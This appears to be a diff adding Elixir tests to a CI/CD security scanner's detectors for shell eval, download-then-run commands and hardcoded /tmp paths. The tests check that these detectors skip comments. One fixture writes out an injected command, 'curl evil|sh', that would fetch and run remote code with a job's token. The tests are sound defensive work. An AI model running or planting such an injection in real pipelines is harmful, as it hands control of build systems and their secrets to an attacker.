@@ -56,6 +56,37 @@ defmodule Hypatia.Rules.CicdRules.ContentScannerTest do
     end
   end
 
+  describe "comment lines are prose, not execution (standards#936/#939)" do
+    test "eval_in_shell ignores comments but still fires on code", %{dir: dir} do
+      File.write!(
+        Path.join(dir, "t.sh"),
+        "# try DESC CMD [ARGS...] -- runs CMD as a real command (no eval)\n"
+      )
+
+      refute Enum.any?(CicdRules.scan_content_patterns(dir), &(&1.rule == :eval_in_shell))
+
+      File.write!(Path.join(dir, "u.sh"), "  # eval-free\neval \"$x\"\n")
+      assert Enum.any?(CicdRules.scan_content_patterns(dir), &(&1.rule == :eval_in_shell))
+    end
+
+    test "download_then_run_shell ignores an indented YAML comment", %{dir: dir} do
+      File.write!(
+        Path.join(dir, "gate.yml"),
+        "    run: |\n      # `x\";curl evil|sh;\"` would run here with this job's token\n"
+      )
+
+      refute Enum.any?(
+               CicdRules.scan_content_patterns(dir),
+               &(&1.rule == :download_then_run_shell)
+             )
+    end
+
+    test "hardcoded_tmp ignores a usage example in a comment", %{dir: dir} do
+      File.write!(Path.join(dir, "l.sh"), "# e.g. ./list.sh > /tmp/paths.txt\n")
+      refute Enum.any?(CicdRules.scan_content_patterns(dir), &(&1.rule == :hardcoded_tmp))
+    end
+  end
+
   describe "inline pragma — # hypatia:ignore <rule_id>" do
     test "same-line pragma suppresses", %{dir: dir} do
       File.write!(Path.join(dir, "ok.sh"), "eval \"$safe\" # hypatia:ignore eval_in_shell\n")
